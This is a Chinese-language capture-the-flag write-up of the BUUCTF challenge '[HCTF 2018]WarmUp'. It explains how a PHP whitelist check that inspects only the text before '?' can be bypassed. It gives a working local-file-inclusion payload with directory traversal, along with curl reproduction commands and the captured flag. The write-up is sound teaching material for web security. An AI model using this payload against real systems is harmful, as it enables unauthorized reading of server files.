---
title: "[HCTF 2018]WarmUp"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [lfi, whitelist-bypass, directory-traversal, php]
vulnerability: 本地文件包含(LFI)白名单绕过+目录穿越
solved: true
flag: "flag{0fdb7959-4223-424e-8f4a-f4eb6443a555}"
---

# [HCTF 2018]WarmUp

## 题目概述
PHP本地文件包含题目，通过白名单校验绕过实现任意文件读取。

## 信息收集

1. 访问题目首页，发现HTML注释 `<!--source.php-->`，提示存在源码文件
2. 访问 `source.php` 获取PHP源码（HTML编码输出）
3. 访问 `hint.php` 得到提示：`flag not here, and flag in ffffllllaaaagggg`

## 漏洞分析

**漏洞类型**：本地文件包含（LFI）+ 白名单绕过

**源码关键逻辑**：

```php
$whitelist = ["source" => "source.php", "hint" => "hint.php"];

// 第一步：直接检查 $page 是否在白名单
if (in_array($page, $whitelist)) return true;

// 第二步：提取 ? 之前的部分再检查
$_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
if (in_array($_page, $whitelist)) return true;

// 第三步：urldecode后再提取 ? 之前的部分检查
$_page = urldecode($page);
$_page = mb_substr($_page, 0, mb_strpos($_page . '?', '?'));
if (in_array($_page, $whitelist)) return true;
```

**判断过程**：
- 白名单只允许 `source.php` 和 `hint.php`
- 但校验逻辑只检查 `?` 之前的部分是否在白名单中
- 通过 `hint.php?/../../..` 的形式，`?`前是 `hint.php`（在白名单中），校验通过
- 实际 `include` 执行的是完整路径 `hint.php?/../../../ffffllllaaaagggg`
- PHP的 `include` 会忽略 `?` 后面的部分，配合 `../` 目录穿越读取目标文件

## 利用过程

**Payload**：
```
?file=hint.php%3F/../../../../ffffllllaaaagggg
```

其中 `%3F` 是 `?` 的URL编码。

**Flag**：
```
flag{0fdb7959-4223-424e-8f4a-f4eb6443a555}
```

## 复现步骤

```bash
# 1. 访问源码
curl "http://TARGET/source.php"

# 2. 获取提示
curl "http://TARGET/hint.php"

# 3. 利用LFI读取flag
curl "http://TARGET/?file=hint.php%3F/../../../../ffffllllaaaagggg"
```

## 技术总结

| 漏洞类型 | 攻击入口 | 核心Payload | 知识点 |
|---------|---------|------------|-------|
| LFI白名单绕过 | `file`参数 | `hint.php?/../../../../ffffllllaaaagggg` | `?`截断+目录穿越 |

## 知识总结

1. **白名单绕过技巧**：当校验逻辑只检查参数的一部分（如`?`之前）时，可以用`?`或`#`截断，使校验通过但实际执行不同路径
2. **PHP include特性**：`include`会执行完整路径，`?`后面的内容会被忽略（在某些配置下）
3. **目录穿越**：`../`配合文件包含可以读取任意位置的文件
4. **信息收集要点**：HTML注释、源码泄露文件（如source.php）、hint文件都是重要线索
